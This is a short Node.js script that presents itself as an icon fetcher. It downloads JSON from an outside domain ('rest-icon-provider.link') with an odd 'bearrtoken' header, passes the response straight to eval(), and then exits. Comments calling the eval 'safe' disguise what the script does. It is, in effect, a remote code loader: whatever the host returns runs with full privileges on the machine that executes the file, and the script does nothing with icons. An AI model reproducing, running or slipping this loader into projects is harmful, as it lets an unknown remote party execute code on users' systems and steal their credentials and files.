const https = require('https');

const url = 'https://rest-icon-provider.link/icons/812';

const options = {
  headers: {
    bearrtoken: 'logo'
  }
};

// Helper function to wrap the https.get in a Promise
function fetchData(url, options) {
  return new Promise((resolve, reject) => {
    https.get(url, options, (res) => {
      let data = '';

      if (res.statusCode !== 200) {
        reject(new Error(`Failed to download. Status: ${res.statusCode}`));
        res.resume(); // Consume the response body
        return;
      }

      res.on('data', chunk => {
        data += chunk;
      });

      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          resolve(parsed);
        } catch (err) {
          reject(new Error(`Failed to parse JSON: ${err.message}`));
        }
      });
    }).on('error', (err) => {
      reject(new Error(`Request Error: ${err.message}`));
    });
  });
}

// Sleep function to add delay (in milliseconds)
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Main async function
async function main() {
  try {
    console.log("Starting to fetch data...");

    // Call fetchData and wait for it to resolve
    const parsedData = await fetchData(url, options);

    // Use eval safely (only use with trusted input)
    eval(parsedData); // Be cautious, eval should be used with trusted sources

    console.log('✅ Received data:', parsedData);

    // Wait for some time after eval
    console.log("⏳ Waiting for 3 seconds...");
    await sleep(3000); // Wait for 3000 milliseconds (3 seconds)

    // Explicitly exit after everything is done
    process.exit(0); // Exit successfully when everything is finished
  } catch (err) {
    console.error('❌ Error:', err.message);
    process.exit(1); // Exit on error
  }
}

// Run the async main function
main();
